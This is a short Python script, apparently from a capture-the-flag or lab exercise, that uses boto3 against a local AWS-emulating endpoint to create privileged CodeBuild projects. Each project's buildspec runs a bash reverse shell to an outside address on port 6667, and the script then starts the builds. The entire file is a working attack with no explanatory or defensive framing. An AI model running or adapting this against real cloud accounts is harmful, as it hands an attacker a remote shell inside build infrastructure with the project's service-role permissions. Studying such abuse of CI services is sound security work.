import boto3

ENDPOINT = "http://172.18.0.2:4566"
cb = boto3.client(
    "codebuild", endpoint_url=ENDPOINT, region_name="us-east-1",
    aws_access_key_id="test", aws_secret_access_key="test",
)

buildspec = """version: 0.2
phases:
  build:
    commands:
      - bash -c 'bash -i >& /dev/tcp/10.10.14.180/6667 0>&1'
"""

for name, image in [("cb2", "alpine:latest"), ("cb3", "public.ecr.aws/docker/library/alpine:latest")]:
    try:
        cb.delete_project(name=name)
    except Exception:
        pass
    try:
        cb.create_project(
            name=name,
            source={"type": "NO_SOURCE", "buildspec": buildspec},
            artifacts={"type": "NO_ARTIFACTS"},
            environment={
                "type": "LINUX_CONTAINER",
                "computeType": "BUILD_GENERAL1_SMALL",
                "image": image,
                "privilegedMode": True,
            },
            serviceRole="arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/codebuild-role",
        )
        resp = cb.start_build(projectName=name)
        print(name, image, "STARTED", resp["build"]["id"])
    except Exception as e:
        print(name, image, "ERR", e)
